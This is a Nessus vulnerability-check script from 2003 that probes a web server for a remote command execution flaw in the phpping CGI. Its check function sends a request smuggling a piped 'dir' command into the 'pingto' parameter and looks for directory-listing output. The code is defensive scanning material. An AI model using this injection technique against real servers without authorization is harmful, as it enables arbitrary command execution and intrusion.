#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# Ref:
# Message-ID: <003d01c2e3d7$8ef3eea0$0300a8c0@goliath>
# From: "Gregory Le Bras | Security Corporation" <gregory.lebras@security-corp.org>
# To: <vulnwatch@vulnwatch.org>
# Subject: [VulnWatch] [SCSA-009] Remote Command Execution Vulnerability in PHP Ping
#

if(description)
{
 script_id(11324);
 script_version ("$Revision: 1.7 $");

 name["english"] = "phpping code execution";

 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to make the remote host execute arbitrary DOS commands
using the CGI phpping.

An attacker may use this flaw to gain a shell with the privileges of the 
web server.

Solution : See http://www.security-corp.org/advisories/SCSA-009.txt or contact the vendor for a patch
Risk factor : High";




 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of phpping";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);



function check(loc)
{
 req = http_get(item:string(loc, "/index.php?pingto=www.nessus.org%20|%20dir"),
 		port:port);			
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL )exit(0);
 if(egrep(pattern:"<DIR>", string:r))
 {
 	security_hole(port);
	exit(0);
 }
}


dir = make_list(cgi_dirs());
dirs = make_list();
foreach d (dir)
 dirs = make_list(dirs, string(d, "/phpping"));

dirs = make_list(dirs, "", "/phpping");



foreach dir (dirs)
{
 check(loc:dir);
}
